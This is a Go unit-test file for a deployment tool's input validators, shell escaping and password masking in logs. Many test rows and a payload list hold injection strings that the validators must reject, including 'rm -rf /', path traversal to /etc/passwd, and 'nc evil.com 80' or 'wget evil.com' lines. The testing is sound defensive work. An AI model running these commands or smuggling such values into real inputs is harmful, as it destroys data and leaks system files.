package security

import (
	"strings"
	"testing"
)

func TestValidateAppName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "myapp", false},
		{"valid with numbers", "myapp123", false},
		{"valid with hyphens", "my-app-name", false},
		{"valid single char", "a", false},
		{"valid two chars", "ab", false},
		{"empty", "", true},
		{"starts with hyphen", "-myapp", true},
		{"ends with hyphen", "myapp-", true},
		{"uppercase", "MyApp", true},
		{"underscore", "my_app", true},
		{"special chars", "my;app", true},
		{"injection attempt", "app;rm -rf /", true},
		{"injection backtick", "app`id`", true},
		{"too long", strings.Repeat("a", 64), true},
		{"max length", strings.Repeat("a", 63), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateAppName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateAppName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateServerName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "production", false},
		{"valid with numbers", "server1", false},
		{"valid with hyphens", "my-server", false},
		{"valid with underscores", "my_server", false},
		{"valid mixed case", "MyServer", false},
		{"valid single char", "a", false},
		{"empty", "", true},
		{"starts with hyphen", "-server", true},
		{"starts with underscore", "_server", true},
		{"special chars", "server;id", true},
		{"injection attempt", "prod;rm -rf /", true},
		{"space", "my server", true},
		{"too long", strings.Repeat("a", 65), true},
		{"max length", strings.Repeat("a", 64), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateServerName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateServerName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateRelease(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid timestamp", "20240115-120000", false},
		{"valid semver", "v1.2.3", false},
		{"valid with dots", "1.0.0", false},
		{"valid with underscores", "release_1", false},
		{"valid single char", "a", false},
		{"empty", "", true},
		{"starts with dot", ".hidden", true},
		{"starts with hyphen", "-release", true},
		{"special chars", "release;id", true},
		{"injection attempt", "v1.0;rm -rf /", true},
		{"space", "release 1", true},
		{"too long", strings.Repeat("a", 129), true},
		{"max length", strings.Repeat("a", 128), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateRelease(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateRelease(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateUnixUser(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "deploy", false},
		{"valid with numbers", "user1", false},
		{"valid with underscore prefix", "_user", false},
		{"valid with hyphen", "my-user", false},
		{"valid www-data", "www-data", false},
		{"empty", "", true},
		{"starts with number", "1user", true},
		{"starts with hyphen", "-user", true},
		{"uppercase", "User", true},
		{"special chars", "user;id", true},
		{"injection attempt", "root;rm -rf /", true},
		{"too long", strings.Repeat("a", 33), true},
		{"max length", strings.Repeat("a", 32), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateUnixUser(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateUnixUser(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateHealthPath(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid root", "/", false},
		{"valid health", "/health", false},
		{"valid nested", "/api/health/check", false},
		{"valid with dots", "/api/v1.0/health", false},
		{"valid with underscore", "/health_check", false},
		{"valid with hyphen", "/health-check", false},
		{"empty", "", false}, // Empty defaults to "/"
		{"no leading slash", "health", true},
		{"special chars", "/health;id", true},
		{"injection attempt", "/health?cmd=`id`", true},
		{"double slash", "//etc/passwd", true},
		{"parent traversal", "/../../etc/passwd", true},
		{"query string", "/health?check=1", true},
		{"space", "/health check", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateHealthPath(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateHealthPath(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateLogTail(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid number", "100", false},
		{"valid all", "all", false},
		{"valid zero", "0", false},
		{"valid large", "10000", false},
		{"empty", "", false}, // Empty defaults to "100"
		{"negative", "-1", true},
		{"not a number", "abc", true},
		{"injection attempt", "100;id", true},
		{"too large", "100001", true},
		{"max allowed", "100000", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateLogTail(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateLogTail(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateLogSince(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid hours", "2h", false},
		{"valid minutes", "30m", false},
		{"valid seconds", "60s", false},
		{"valid days", "1d", false},
		{"valid combined", "1h30m", false},
		{"valid date", "2024-01-15", false},
		{"valid datetime", "2024-01-15T10:30:00", false},
		{"empty", "", false}, // Empty means no filter
		{"invalid format", "yesterday", true},
		{"injection attempt", "2h;id", true},
		{"special chars", "2h`id`", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateLogSince(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateLogSince(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateEnvKey(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "DATABASE_URL", false},
		{"valid with numbers", "VAR1", false},
		{"valid underscore prefix", "_PRIVATE", false},
		{"valid lowercase", "my_var", false},
		{"empty", "", true},
		{"starts with number", "1VAR", true},
		{"hyphen", "MY-VAR", true},
		{"special chars", "VAR;id", true},
		{"space", "MY VAR", true},
		{"injection attempt", "VAR`id`", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateEnvKey(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateEnvKey(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateDockerCommand(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "php bin/console cache:clear", false},
		{"valid composer", "composer install", false},
		{"empty", "", true},
		{"semicolon injection", "ls; rm -rf /", true},
		{"and injection", "ls && rm -rf /", true},
		{"or injection", "ls || rm -rf /", true},
		{"pipe injection", "cat /etc/passwd | nc evil.com 80", true},
		{"backtick injection", "echo `id`", true},
		{"subshell injection", "echo $(id)", true},
		{"redirect injection", "echo data > /etc/passwd", true},
		{"variable expansion", "echo ${PATH}", true},
		{"newline injection", "ls\nrm -rf /", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDockerCommand(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateDockerCommand(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestShellEscape(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{"empty string", "", "''"},
		{"simple string", "hello", "'hello'"},
		{"with spaces", "hello world", "'hello world'"},
		{"with single quotes", "it's", "'it'\\''s'"},
		{"with double quotes", `say "hello"`, `'say "hello"'`},
		{"with backticks", "echo `id`", "'echo `id`'"},
		{"with dollar paren", "echo $(id)", "'echo $(id)'"},
		{"with dollar brace", "echo ${PATH}", "'echo ${PATH}'"},
		{"with newline", "line1\nline2", "'line1\nline2'"},
		{"with semicolon", "cmd1; cmd2", "'cmd1; cmd2'"},
		{"DATABASE_URL with special chars", "postgresql://user:p@ss'w0rd@host:5432/db?version=16", "'postgresql://user:p@ss'\\''w0rd@host:5432/db?version=16'"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ShellEscape(tt.input)
			if got != tt.expected {
				t.Errorf("ShellEscape(%q) = %q, want %q", tt.input, got, tt.expected)
			}
		})
	}
}

func TestValidateHook(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid php console", "php bin/console cache:clear", false},
		{"valid composer", "composer install --no-dev", false},
		{"valid migration", "php bin/console doctrine:migrations:migrate --no-interaction", false},
		{"empty", "", true},
		{"semicolon injection", "php bin/console; rm -rf /", true},
		{"and injection", "php bin/console && cat /etc/passwd", true},
		{"pipe injection", "php bin/console | nc evil.com 80", true},
		{"backtick injection", "php bin/console `id`", true},
		{"subshell injection", "php bin/console $(whoami)", true},
		{"redirect injection", "php bin/console > /tmp/evil", true},
		{"newline injection", "php bin/console\nrm -rf /", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateHook(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateHook(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateSharedDir(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "var", false},
		{"valid nested", "var/log", false},
		{"valid with dots", "var/log.1", false},
		{"valid with hyphens", "my-dir", false},
		{"valid with underscores", "my_dir", false},
		{"valid deep", "var/log/app", false},
		{"empty", "", true},
		{"absolute path", "/var/log", true},
		{"parent traversal", "../etc", true},
		{"hidden traversal", "var/../../etc", true},
		{"with spaces", "var log", true},
		{"with semicolon", "var;id", true},
		{"with backtick", "var`id`", true},
		{"with shell expansion", "var$(id)", true},
		{"double slash", "var//log", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateSharedDir(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateSharedDir(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestGenerateHeredocDelimiter(t *testing.T) {
	t.Run("non-empty", func(t *testing.T) {
		delim := GenerateHeredocDelimiter("ENVEOF")
		if delim == "" {
			t.Error("GenerateHeredocDelimiter returned empty string")
		}
	})

	t.Run("has prefix", func(t *testing.T) {
		delim := GenerateHeredocDelimiter("ENVEOF")
		if !strings.HasPrefix(delim, "ENVEOF_") {
			t.Errorf("expected prefix 'ENVEOF_', got %q", delim)
		}
	})

	t.Run("unique between calls", func(t *testing.T) {
		delim1 := GenerateHeredocDelimiter("TEST")
		delim2 := GenerateHeredocDelimiter("TEST")
		if delim1 == delim2 {
			t.Error("GenerateHeredocDelimiter returned identical values on consecutive calls")
		}
	})
}

func TestSanitizeCommandForLog(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		contains string // substring that should NOT be present
		masked   bool   // true if the output should contain ****
	}{
		{
			"masks DATABASE_URL",
			"-e DATABASE_URL='postgresql://user:secret@host/db'",
			"secret",
			true,
		},
		{
			"masks POSTGRES_PASSWORD",
			"-e POSTGRES_PASSWORD=mysecretpass",
			"mysecretpass",
			true,
		},
		{
			"masks MYSQL_PASSWORD",
			"-e MYSQL_PASSWORD=mysqlpass123",
			"mysqlpass123",
			true,
		},
		{
			"masks MYSQL_ROOT_PASSWORD",
			"-e MYSQL_ROOT_PASSWORD=rootpass",
			"rootpass",
			true,
		},
		{
			"masks -p<password>",
			"mysqladmin ping -uadmin -psecretpass --silent",
			"secretpass",
			true,
		},
		{
			"no masking for safe commands",
			"docker exec myapp php bin/console cache:clear",
			"",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeCommandForLog(tt.input)
			if tt.masked && !strings.Contains(result, "****") {
				t.Errorf("expected masked output to contain '****', got %q", result)
			}
			if tt.contains != "" && strings.Contains(result, tt.contains) {
				t.Errorf("sanitized output should not contain %q, got %q", tt.contains, result)
			}
		})
	}
}

// Test injection attempts that could bypass validation
func TestInjectionAttempts(t *testing.T) {
	injectionPayloads := []string{
		"test;rm -rf /",
		"test && cat /etc/passwd",
		"test || wget evil.com",
		"test`id`",
		"test$(whoami)",
		"test\nmalicious",
		"test\rmalicious",
		"test|nc evil.com 80",
		"test>/etc/passwd",
		"test<script>",
	}

	t.Run("AppName blocks injection", func(t *testing.T) {
		for _, payload := range injectionPayloads {
			if err := ValidateAppName(payload); err == nil {
				t.Errorf("ValidateAppName should reject: %q", payload)
			}
		}
	})

	t.Run("ServerName blocks injection", func(t *testing.T) {
		for _, payload := range injectionPayloads {
			if err := ValidateServerName(payload); err == nil {
				t.Errorf("ValidateServerName should reject: %q", payload)
			}
		}
	})

	t.Run("Release blocks injection", func(t *testing.T) {
		for _, payload := range injectionPayloads {
			if err := ValidateRelease(payload); err == nil {
				t.Errorf("ValidateRelease should reject: %q", payload)
			}
		}
	})

	t.Run("UnixUser blocks injection", func(t *testing.T) {
		for _, payload := range injectionPayloads {
			if err := ValidateUnixUser(payload); err == nil {
				t.Errorf("ValidateUnixUser should reject: %q", payload)
			}
		}
	})

	t.Run("LogTail blocks injection", func(t *testing.T) {
		for _, payload := range injectionPayloads {
			if err := ValidateLogTail(payload); err == nil {
				t.Errorf("ValidateLogTail should reject: %q", payload)
			}
		}
	})

	t.Run("LogSince blocks injection", func(t *testing.T) {
		for _, payload := range injectionPayloads {
			if err := ValidateLogSince(payload); err == nil {
				t.Errorf("ValidateLogSince should reject: %q", payload)
			}
		}
	})
}
